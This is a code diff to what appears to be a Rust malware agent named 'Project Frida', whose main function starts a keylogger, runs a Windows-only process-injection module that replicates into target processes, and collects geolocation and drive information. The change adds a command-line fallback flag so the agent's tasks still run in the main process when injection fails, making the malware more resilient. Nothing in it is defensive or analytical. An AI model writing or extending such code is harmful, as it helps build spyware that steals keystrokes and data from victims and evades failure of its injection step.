@@ -35,6 +35,8 @@ pub mod crawler;
 /// Process injection module (Windows-only)
 #[cfg(windows)]
 pub mod replica;
+
+pub mod agent_tasks;
 use crate::geolocation::Geolocator;
 use crate::log::Log;
 use serde::Serialize;
@@ -46,6 +48,16 @@ use std::path::Path;
 use tokio::select;
 use tokio::signal::ctrl_c;
 use tokio::time::{interval, Duration};
+use clap::Parser;
+
+/// Command-line arguments for the FRIDA agent.
+#[derive(Parser, Debug)]
+#[command(author, version, about, long_about = None)]
+struct Args {
+    /// Enable fallback mode to run agent tasks in the main process if injection fails.
+    #[arg(long, env = "FRIDA_ENABLE_FALLBACK", default_value_t = false)]
+    fallback: bool,
+}
 
 #[derive(Serialize)]
 struct Payload<'a> {
@@ -55,6 +67,7 @@ struct Payload<'a> {
 
 #[tokio::main]
 async fn main() {
+    let args = Args::parse();
     Log::info(format!("Project Frida (Rust Edition) - Initializing..."));
     // 1. Start the keylogger in a background thread.
     keylogger::start_keylogger();
@@ -68,7 +81,12 @@ async fn main() {
     // 1.4. Start process replication service (Windows-only)
     #[cfg(windows)]
     {
-        replica::replicate_to_targets();
+        let successful_injections = replica::replicate_to_targets();
+        if successful_injections == 0 && args.fallback {
+            Log::warn("Injection failed. Running tasks in main process (fallback mode).".to_string());
+            // Run the tasks in the main process since injection failed.
+            agent_tasks::run().await;
+        }
     }
 
     // 2. Collect drive info.
